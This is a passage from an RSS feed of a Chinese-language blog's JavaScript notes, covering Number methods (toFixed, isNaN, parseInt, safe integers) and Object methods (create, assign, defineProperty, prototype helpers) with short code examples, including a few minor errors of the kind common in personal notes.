clearlove7<span>.</span><span>getHarm</span><span>(</span><span>)</span> <span>// => [4, 3, 9, 6]</span>
xiaohu<span>.</span><span>getHarm</span><span>(</span><span>)</span> <span>// => [4, 3, 9]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br></div></div></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Number</title>
      <link>https://www.matrixtheone.ga/web/note/js/Number/</link>
      <guid>https://www.matrixtheone.ga/web/note/js/Number/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Number</source>
      <category>JS 基础</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-number-any"> 1. Number(any)</h2>
<ul>
<li>构造函数创建数字。</li>
</ul>
<div><pre><code><span>Number</span><span>(</span><span>7</span><span>)</span> <span>// => 7</span>
<span>Number</span><span>(</span><span>{</span><span>}</span><span>)</span> <span>// => NaN</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_2-tofixed-number"> 2. toFixed(number)</h2>
<ul>
<li>
<p>舍入与浮点数相关，返回字符串。</p>
</li>
<li>
<p>各浏览器间可能存在差异，非完全的银行家舍入法。</p>
</li>
</ul>
<div><pre><code><span>3.355</span><span>.</span><span>toFixed</span><span>(</span><span>2</span><span>)</span> <span>// => '3.35'</span>
<span>3.455</span><span>.</span><span>toFixed</span><span>(</span><span>2</span><span>)</span> <span>// => '3.46'</span>
<span>3.3551</span><span>.</span><span>toFixed</span><span>(</span><span>2</span><span>)</span> <span>// => '3.36'</span>

<span>-</span><span>3.355</span><span>.</span><span>toFixed</span><span>(</span><span>2</span><span>)</span> <span>// => -3.35 由于操作符优先级，（-）后返回数字</span>
<span>(</span><span>-</span><span>3.355</span><span>)</span><span>.</span><span>toFixed</span><span>(</span><span>2</span><span>)</span> <span>// => '-3.35'</span>

<span>// 四舍五入保留小数</span>
<span>function</span> <span>$toFixed</span> <span>(</span><span>val<span>,</span> exp</span><span>)</span> <span>{</span>
  <span>return</span> val <span>!==</span> <span>void</span> <span>0</span>
    <span>?</span> <span>+</span><span>(</span>Math<span>.</span><span>round</span><span>(</span>val <span>*</span> Math<span>.</span><span>pow</span><span>(</span><span>10</span><span>,</span> exp<span>)</span><span>)</span> <span>/</span> Math<span>.</span><span>pow</span><span>(</span><span>10</span><span>,</span> exp<span>)</span><span>)</span><span>.</span><span>toFixed</span><span>(</span>exp<span>)</span>
    <span>:</span> <span>+</span><span>(</span><span>0</span><span>)</span><span>.</span><span>toFixed</span><span>(</span>exp<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="_3-isnan-any"> 3. isNaN(any)</h2>
<ul>
<li>判断是否为 NaN 类型，非数字类型会先转换为数字后再判断。</li>
</ul>
<div><pre><code><span>isNaN</span><span>(</span><span>NaN</span><span>)</span> <span>// => true</span>
<span>isNaN</span><span>(</span><span>0</span> <span>/</span> <span>0</span><span>)</span> <span>// => true</span>
<span>isNaN</span><span>(</span><span>''</span><span>)</span> <span>// => false</span>
<span>isNaN</span><span>(</span><span>'clearlove7'</span><span>)</span> <span>// => true</span>
<span>isNaN</span><span>(</span><span>null</span><span>)</span> <span>// => false</span>
<span>isNaN</span><span>(</span><span>undefined</span><span>)</span> <span>// => true</span>
<span>isNaN</span><span>(</span><span>[</span><span>]</span><span>)</span> <span>// => false</span>
<span>isNaN</span><span>(</span><span>[</span><span>'clearlove7'</span><span>]</span><span>)</span> <span>// => true</span>
<span>isNaN</span><span>(</span><span>{</span><span>}</span><span>)</span> <span>// => true</span>

<span>// 0 除以 0 会返回 NaN，其他数除以 0 均不会返回 NaN</span>
<span>0</span> <span>/</span> <span>0</span> <span>// => NaN</span>
<span>7</span> <span>/</span> <span>0</span> <span>// => Infinity</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="_4-number-isnan-any"> 4. Number.isNaN(any)</h2>
<ul>
<li>只有 NaN 时判断为 true，非数字类型不会进行转换后再判断。</li>
</ul>
<div><pre><code>Number<span>.</span><span>isNaN</span><span>(</span><span>NaN</span><span>)</span> <span>// => true</span>
Number<span>.</span><span>isNaN</span><span>(</span><span>0</span> <span>/</span> <span>0</span><span>)</span> <span>// => true</span>
Number<span>.</span><span>isNaN</span><span>(</span><span>''</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isNaN</span><span>(</span><span>'clearlove7'</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isNaN</span><span>(</span><span>null</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isNaN</span><span>(</span><span>undefined</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isNaN</span><span>(</span><span>[</span><span>]</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isNaN</span><span>(</span><span>[</span><span>'clearlove7'</span><span>]</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isNaN</span><span>(</span><span>{</span><span>}</span><span>)</span> <span>// => false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><h2 id="_5-isfinite-any"> 5. isFinite(any)</h2>
<ul>
<li>判断是否为有限数值，只有 <code>NaN</code>、<code>Infinity</code>、<code>-Infinity</code> 判断为 false，非数字类型会先转换为数字后再判断。</li>
</ul>
<div><pre><code><span>isFinite</span><span>(</span><span>NaN</span><span>)</span> <span>// => false</span>
<span>isFinite</span><span>(</span><span>Infinity</span><span>)</span> <span>// => false</span>
<span>isFinite</span><span>(</span><span>-</span><span>Infinity</span><span>)</span> <span>// => false</span>
<span>isFinite</span><span>(</span><span>0</span> <span>/</span> <span>0</span><span>)</span> <span>// => false</span>
<span>isFinite</span><span>(</span><span>''</span><span>)</span> <span>// => true</span>
<span>isFinite</span><span>(</span><span>'clearlove7'</span><span>)</span> <span>// => false</span>
<span>isFinite</span><span>(</span><span>null</span><span>)</span> <span>// => true</span>
<span>isFinite</span><span>(</span><span>undefined</span><span>)</span> <span>// => false</span>
<span>isFinite</span><span>(</span><span>[</span><span>]</span><span>)</span> <span>// => true</span>
<span>isFinite</span><span>(</span><span>[</span><span>'clearlove7'</span><span>]</span><span>)</span> <span>// => false</span>
<span>isFinite</span><span>(</span><span>{</span><span>}</span><span>)</span> <span>// => false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><h2 id="_6-parseint-string-radix"> 6. parseInt(string, radix)</h2>
<ul>
<li>
<p>第二个参数 radix 是 2-36 之间的整数，表示被解析字符串的基数，超出基数范围返回 NaN。</p>
</li>
<li>
<p>转换为整型（截除小数部分），转换失败返回 NaN。若是以数字开头的字符串，截取到非数字前面，或截取到第二个小数点前面。</p>
</li>
</ul>
<div><pre><code><span>parseInt</span><span>(</span><span>4.396</span><span>)</span> <span>// => 4</span>
<span>parseInt</span><span>(</span><span>'7.77'</span><span>)</span> <span>// => 7</span>
<span>parseInt</span><span>(</span><span>'43.9.6jack'</span><span>)</span> <span>// => 43</span>
<span>parseInt</span><span>(</span><span>'jack'</span><span>)</span> <span>// => NaN</span>

<span>// 其他进制转换为 10 进制</span>
<span>parseInt</span><span>(</span><span>1100001001</span><span>,</span> <span>2</span><span>)</span> <span>// => 777</span>
<span>// 将 'D' 按 16 进制转换</span>
<span>parseInt</span><span>(</span><span>'D'</span><span>,</span> <span>16</span><span>)</span> <span>// => 13</span>
<span>// 因 'J' 大于 16 进制位数（F），转换失败</span>
<span>parseInt</span><span>(</span><span>'J'</span><span>,</span> <span>16</span><span>)</span> <span>// => NaN</span>
<span>// 经典面试题</span>
<span>[</span><span>10</span><span>,</span> <span>10</span><span>,</span> <span>10</span><span>,</span> <span>10</span><span>,</span> <span>10</span><span>]</span><span>.</span><span>map</span><span>(</span>parseInt<span>)</span> <span>// => [10, NaN, 2, 3, 4]</span>

<span>// 来自《你不知道的 JS（中）》示例</span>
<span>parseInt</span><span>(</span><span>1</span> <span>/</span> <span>0</span><span>,</span> <span>19</span><span>)</span> <span>// => 18</span>

<span>parseInt</span><span>(</span><span>0.000008</span><span>)</span> <span>// => 0 （'0'来自于'0.000008'）</span>
<span>parseInt</span><span>(</span><span>0.0000008</span><span>)</span> <span>// => 8 （'8'来自于'8e-7'）</span>
<span>parseInt</span><span>(</span><span>false</span><span>,</span> <span>16</span><span>)</span> <span>// => 250 （'fa'来自于'false'）</span>
<span>parseInt</span><span>(</span>parseInt<span>,</span> <span>16</span><span>)</span> <span>// => 15 （'f'来自于'function..'）</span>

<span>parseInt</span><span>(</span><span>'0x10'</span><span>)</span> <span>// => 16</span>
<span>parseInt</span><span>(</span><span>'103'</span><span>,</span> <span>2</span><span>)</span> <span>// => 2</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div><h2 id="_7-parsefloat-string"> 7. parseFloat(string)</h2>
<ul>
<li>转换为浮点型，转换失败返回 NaN。若是以数字开头的字符串，截取到非数字前面，或截取到第二个小数点前面。</li>
</ul>
<div><pre><code><span>parseFloat</span><span>(</span><span>43.96</span><span>)</span> <span>// => 43.96</span>
<span>parseFloat</span><span>(</span><span>'7.77'</span><span>)</span> <span>// => 7.77</span>
<span>parseFloat</span><span>(</span><span>'43.9.6jack'</span><span>)</span> <span>// => 43.9</span>
<span>parseFloat</span><span>(</span><span>'love'</span><span>)</span> <span>// => NaN</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_8-number-isinteger-any"> 8. Number.isInteger(any)</h2>
<ul>
<li>判断给定的参数是否为整数。</li>
</ul>
<div><pre><code>Number<span>.</span><span>isInteger</span><span>(</span><span>7</span><span>)</span> <span>// => true</span>
Number<span>.</span><span>isInteger</span><span>(</span><span>7.7</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isInteger</span><span>(</span><span>NaN</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isInteger</span><span>(</span><span>null</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isInteger</span><span>(</span><span>true</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isInteger</span><span>(</span><span>Infinity</span><span>)</span> <span>// => false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_9-number-isfinite-any"> 9. Number.isFinite(any)</h2>
<ul>
<li>判断给定的参数是否为有穷数。</li>
</ul>
<div><pre><code>Number<span>.</span><span>isFinite</span><span>(</span><span>7.7</span><span>)</span> <span>// => true</span>
Number<span>.</span><span>isFinite</span><span>(</span><span>1</span> <span>/</span> <span>0</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isFinite</span><span>(</span><span>NaN</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isFinite</span><span>(</span><span>null</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isFinite</span><span>(</span><span>true</span><span>)</span> <span>// => false</span>
Number<span>.</span><span>isFinite</span><span>(</span><span>Infinity</span><span>)</span> <span>// => false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_10-number-max-safe-integer-number-min-safe-integer"> 10. Number.MAX_SAFE_INTEGER &amp;&amp; Number.MIN_SAFE_INTEGER</h2>
<ul>
<li>
<p>IEEE754 规定，在计算机内部保存有效数字时，默认尾数第一位隐含为 1，可以舍去第一位，读取时再加上，所以 52 位有效数字实际可以存储 53 位。</p>
</li>
<li>
<p><span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:0.8141em;"></span><span><span>2</span><span><span><span><span style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;"></span><span><span><span>53</span></span></span></span></span></span></span></span></span></span></span></span> 是可以正确表示的最大整数，但因 <span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:0.8141em;"></span><span><span>2</span><span><span><span><span style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;"></span><span><span><span>53</span></span></span></span></span></span></span></span></span></span></span></span> 与 <span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:0.8974em;vertical-align:-0.0833em;"></span><span><span>2</span><span><span><span><span style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;"></span><span><span><span>53</span></span></span></span></span></span></span></span></span><span style="margin-right:0.2222em;"></span><span>+</span><span style="margin-right:0.2222em;"></span></span><span><span style="height:0.6444em;"></span><span>1</span></span></span></span> 表示一样（尾数均有53位，IEEE754 有效位为 52 位，所以要舍去最后一位，舍去后表示就一样了），所以 <span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:0.8141em;"></span><span><span>2</span><span><span><span><span style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;"></span><span><span><span>53</span></span></span></span></span></span></span></span></span></span></span></span> 是不安全的。</p>
</li>
</ul>
<div><pre><code>Number<span>.</span><span>MAX_SAFE_INTEGER</span> <span>===</span> <span>2</span> <span>**</span> <span>53</span> <span>-</span> <span>1</span> <span>// => true</span>
Number<span>.</span><span>MIN_SAFE_INTEGER</span> <span>===</span> <span>-</span><span>(</span><span>2</span> <span>**</span> <span>53</span> <span>-</span> <span>1</span><span>)</span> <span>// => true</span>

Number<span>.</span><span>MAX_SAFE_INTEGER</span> <span>+</span> <span>1</span> <span>===</span> Number<span>.</span><span>MAX_SAFE_INTEGER</span> <span>+</span> <span>2</span> <span>// => true</span>
Number<span>.</span><span>MIN_SAFE_INTEGER</span> <span>-</span> <span>1</span> <span>===</span> Number<span>.</span><span>MIN_SAFE_INTEGER</span> <span>-</span> <span>2</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li><a href="https://zh.wikipedia.org/wiki/IEEE_754" target="_blank" rel="noopener noreferrer">IEEE 754 - 维基百科</a></li>
</ul>
<h2 id="_11-number-issafeinteger-any"> 11. Number.isSafeInteger(any)</h2>
<ul>
<li>判断传入的参数是否为安全整数。</li>
</ul>
<div><pre><code>Number<span>.</span><span>isSafeInteger</span><span>(</span>Number<span>.</span><span>MAX_SAFE_INTEGER</span><span>)</span> <span>// => true</span>
Number<span>.</span><span>isSafeInteger</span><span>(</span>Number<span>.</span><span>MAX_SAFE_INTEGER</span> <span>+</span> <span>1</span><span>)</span> <span>// => false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_12-tostring-radix"> 12. toString(radix)</h2>
<ul>
<li>
<p>默认转换为 10 进制字符串，只有数字有进制转换表示。</p>
</li>
<li>
<p>radix 是 2-36 之间的整数，表示被转换字符串的基数，超出基数范围将报错。</p>
</li>
</ul>
<div><pre><code><span>777.</span><span>.</span><span>toString</span><span>(</span><span>2</span><span>)</span> <span>// => '1100001001'</span>
<span>'777'</span><span>.</span><span>toString</span><span>(</span><span>2</span><span>)</span> <span>// => '777'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Object</title>
      <link>https://www.matrixtheone.ga/web/note/js/Object/</link>
      <guid>https://www.matrixtheone.ga/web/note/js/Object/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Object</source>
      <category>JS 基础</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-object-any"> 1. Object(any)</h2>
<ul>
<li>
<p>创建一个对象包装器，俗称装箱。</p>
<blockquote>
<ol>
<li>null 与 undefined 返回空对象。</li>
<li>基本数据类型返回包装后的对象。</li>
<li>引用数据类型返回本身。</li>
</ol>
</blockquote>
</li>
</ul>
<div><pre><code><span>Object</span><span>(</span><span>null</span><span>)</span> <span>// => {}</span>
<span>Object</span><span>(</span><span>undefined</span><span>)</span> <span>// => {}</span>

<span>Object</span><span>(</span><span><span>7</span></span><span>)</span> <span>=></span> <span>// => {7}</span>
<span>Object</span><span>(</span><span>7</span><span>)</span><span>.</span><span>valueOf</span><span>(</span><span>)</span> <span>===</span> <span>7</span> <span>// => true</span>

<span>const</span> reg <span>=</span> <span><span>/</span><span>7</span><span>/</span></span>
<span>Object</span><span>(</span>reg<span>)</span> <span>===</span> reg <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_2-object-create-proto-options"> 2. Object.create(proto, options)</h2>
<ul>
<li>
<p>2006 年，Douglas Crockford 写了一篇文章：<a href="https://www.crockford.com/javascript/prototypal.html" target="_blank" rel="noopener noreferrer">《JavaScript 中的原型式继承》</a>。ECMAScript 5 通过增加 Object.create() 方法将原型式继承的概念规范化了，第二个参数同 Object.defineProperties() 第二个参数。</p>
<blockquote>
<p>本质上，object() 是对传入的对象执行了一次浅复制。Object.create() 只使用一个参数时与 object() 等价。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>function</span> <span>object</span><span>(</span><span>o</span><span>)</span> <span>{</span>
  <span>function</span> <span>F</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>F</span><span>.</span>prototype <span>=</span> o
  <span>return</span> <span>new</span> <span>F</span><span>(</span><span>)</span>
<span>}</span>

<span>// 以下等价</span>
<span>const</span> foo <span>=</span> <span>{</span><span>}</span>
<span>const</span> foo <span>=</span> Object<span>.</span><span>create</span><span>(</span><span>Object</span><span>.</span>prototype<span>)</span>
<span>const</span> foo <span>=</span> <span>object</span><span>(</span><span>Object</span><span>.</span>prototype<span>)</span>

<span>// 创建完全为空的对象，无原型链</span>
Object<span>.</span><span>create</span><span>(</span><span>null</span><span>)</span> <span>// => {}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="_3-hasownproperty-prop"> 3. hasOwnProperty(prop)</h2>
<ul>
<li>
<p>检测自身是否拥有该属性，不包含原型链中的属性。</p>
</li>
<li>
<p>in 运算符会查找原型链中的可枚举属性。</p>
</li>
</ul>
<div><pre><code><span>function</span> <span>Skt</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>Skt</span><span>.</span>prototype<span>.</span>faker <span>=</span> <span>3</span>
<span>const</span> edg <span>=</span> <span>new</span> <span>Skt</span><span>(</span><span>)</span>
edg<span>.</span>clearlove7 <span>=</span> <span>0</span>

edg<span>.</span><span>hasOwnProperty</span><span>(</span><span>'faker'</span><span>)</span> <span>// => false</span>
edg<span>.</span><span>hasOwnProperty</span><span>(</span><span>'clearlove7'</span><span>)</span> <span>// => true</span>

<span>'faker'</span> <span>in</span> edg <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><h2 id="_4-isprototypeof-object"> 4. isPrototypeOf(object)</h2>
<ul>
<li>
<p>检测一个对象是否在其原型链上（Bar.isPrototypeOf(foo) 为检测 foo.__proto__ === Bar）。</p>
</li>
<li>
<p>instanceof 检测构造函数的 prototype 属性是否出现在某个实例对象的原型链上（foo instanceof Bar 为检测 foo.__proto__ === Bar.prototype）。</p>
</li>
<li>
<p>Bar.prototype.isPrototypeOf(foo) 等价于 foo instanceof Bar。</p>
</li>
</ul>
<div><pre><code><span>function</span> <span>Foo</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>const</span> bar <span>=</span> <span>new</span> <span>Foo</span><span>(</span><span>)</span>

<span>Foo</span><span>.</span>prototype<span>.</span><span>isPrototypeOf</span><span>(</span>bar<span>)</span> <span>// => true</span>
<span>Object</span><span>.</span>prototype<span>.</span><span>isPrototypeOf</span><span>(</span>bar<span>)</span> <span>// => true</span>
<span>Function</span><span>.</span>prototype<span>.</span><span>isPrototypeOf</span><span>(</span>bar<span>)</span> <span>// => false</span>

bar <span>instanceof</span> <span>Foo</span> <span>// => true</span>
bar <span>instanceof</span> <span>Object</span> <span>// => true</span>
bar <span>instanceof</span> <span>Function</span> <span>// => false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h2 id="_5-object-assign-targetobject-object"> 5. Object.assign(targetObject, object...)</h2>
<ul>
<li>
<p>将多个对象中可枚举属性合并至目标对象，属性名相同时会覆盖。</p>
</li>
<li>
<p>{...} 展开运算符可完全替代 Object.assign()，较 Object.assign() 有简便和性能上的优势。</p>
</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
<span>}</span>
<span>const</span> bar <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'姜姒'</span><span>,</span>
<span>}</span>

Object<span>.</span><span>assign</span><span>(</span>foo<span>,</span> bar<span>)</span> <span>// => {name: '姜姒', age: 17}</span>
<span>{</span><span>...</span>foo<span>,</span> <span>...</span>bar<span>}</span> <span>// => {name: '姜姒', age: 17}</span>

<span>// 传入可迭代对象</span>
Object<span>.</span><span>assign</span><span>(</span><span>{</span><span>}</span><span>,</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]</span><span>)</span> <span>// => {0: 1, 1: 2, 2: 3}</span>
Object<span>.</span><span>assign</span><span>(</span><span>{</span><span>}</span><span>,</span> <span>'neo'</span><span>)</span> <span>// => => {0: 'n', 1: 'e', 2: 'o'}</span>
<span>{</span><span>...</span><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]</span><span>}</span> <span>// => {0: 1, 1: 2, 2: 3}</span>
<span>{</span><span>...</span><span>'neo'</span><span>}</span> <span>// => => {0: 'n', 1: 'e', 2: 'o'}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><h2 id="_6-object-prototype-tostring"> 6. Object.prototype.toString()</h2>
<ul>
<li>通过 Object.prototype.toString.call() 获取对象的类型（最全面的检测方式）。</li>
</ul>
<div><pre><code><span>const</span> <span>detectionType</span> <span>=</span> <span>value</span> <span>=></span>
  <span>typeof</span> value <span>===</span> <span>'object'</span>
    <span>?</span> <span>{</span><span>}</span><span>.</span><span>toString</span><span>.</span><span>call</span><span>(</span>value<span>)</span><span>.</span><span>slice</span><span>(</span><span>8</span><span>,</span> <span>-</span><span>1</span><span>)</span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span>
    <span>:</span> <span>typeof</span> value
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_7-object-setprototypeof-object-proto"> 7. Object.setPrototypeOf(object, proto)</h2>
<ul>
<li>
<p>设置对象的原型（Object.setPrototypeOf(foo, bar) 等价于 foo.__proto__ = bar）。</p>
</li>
<li>
<p>由于更改对象的原型指向性能并不好，更推荐使用 Object.create() 创建新对象并设置其对象的原型。</p>
</li>
</ul>
<div><pre><code><span>function</span> <span>Foo</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>Foo</span><span>.</span>prototype<span>.</span>matrix <span>=</span> <span>'neo'</span>

<span>// 以下等价</span>
Object<span>.</span><span>setPrototypeOf</span><span>(</span><span>{</span><span>}</span><span>,</span> <span>Foo</span><span>.</span>prototype<span>)</span>
Object<span>.</span><span>create</span><span>(</span><span>Foo</span><span>.</span>prototype<span>)</span>
<span>(</span><span>{</span><span>}</span><span>)</span><span>.</span>__proto__ <span>=</span> <span>Foo</span><span>.</span>prototype
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_8-object-getprototypeof-object"> 8. Object.getPrototypeOf(object)</h2>
<ul>
<li>获取对象的原型（Object.getPrototypeOf(bar) 获取 bar.__proto__）。</li>
</ul>
<div><pre><code><span>function</span> <span>Foo</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>const</span> bar <span>=</span> <span>new</span> <span>Foo</span><span>(</span><span>)</span>

Object<span>.</span><span>getPrototypeOf</span><span>(</span>bar<span>)</span> <span>===</span> <span>Foo</span><span>.</span>prototype <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_9-object-defineproperty-object-prop-options"> 9. Object.defineProperty(object, prop, options)</h2>
<ul>
<li>
<p>定义对象属性（Vue 2.x 数据响应式中应用此方法）。</p>
</li>
<li>
<p>当配置了 get() 或 set() 方法，value 和 writable 配置将会失效。</p>
</li>
<li>
<p>配置默认值是使用 Object.defineProperty() 定义属性时的默认值，若在 foo 中先定义 name 属性，则默认值 writable、enumerable、configurable 为 true。</p>
</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span><span>}</span>

Object<span>.</span><span>defineProperty</span><span>(</span>foo<span>,</span> <span>'name'</span><span>,</span> <span>{</span>
  <span>// 属性的值，默认undefined</span>
  <span>value</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>// 是否可写，默认false</span>
  <span>writable</span><span>:</span> <span>true</span><span>,</span>
  <span>// 是否可枚举，默认false</span>
  <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
  <span>// 是否可配置，默认false</span>
  <span>configurable</span><span>:</span> <span>true</span><span>,</span>
  <span>// 获取属性时执行的方法</span>
  <span>get</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>'获取name值'</span>
  <span>}</span><span>,</span>
  <span>// 设置属性时执行的方法</span>
  <span>set</span><span>(</span>newValue<span>)</span> <span>{</span>
    <span>return</span> <span>'设置name值'</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div><h2 id="_10-object-defineproperties-object-props"> 10. Object.defineProperties(object, props)</h2>
<ul>
<li>与 Object.defineProperty() 用法类似，可以一次定义多个属性。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span><span>}</span>

Object<span>.</span><span>defineProperties</span><span>(</span>foo<span>,</span> <span>{</span>
  <span>name</span><span>:</span> <span>{</span>
    <span>value</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
    <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
  <span>age</span><span>:</span> <span>{</span>
    <span>get</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>'获取age值'</span>
    <span>}</span><span>,</span>
    <span>set</span><span>(</span>newValue<span>)</span> <span>{</span>
      <span>return</span> <span>'设置age值'</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><h2 id="_11-object-getownpropertydescriptor-object-prop"> 11. Object.getOwnPropertyDescriptor(object, prop)</h2>
<ul>
<li>获取自身对应属性的描述符。</li>
</ul>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span><span>}</span>

Object<span>.</span><span>defineProperty</span><span>(</span>foo<span>,</span> <span>'name'</span><span>,</span> <span>{</span>
  <span>value</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>writable</span><span>:</span> <span>true</span><span>,</span>
<span>}</span><span>)</span>

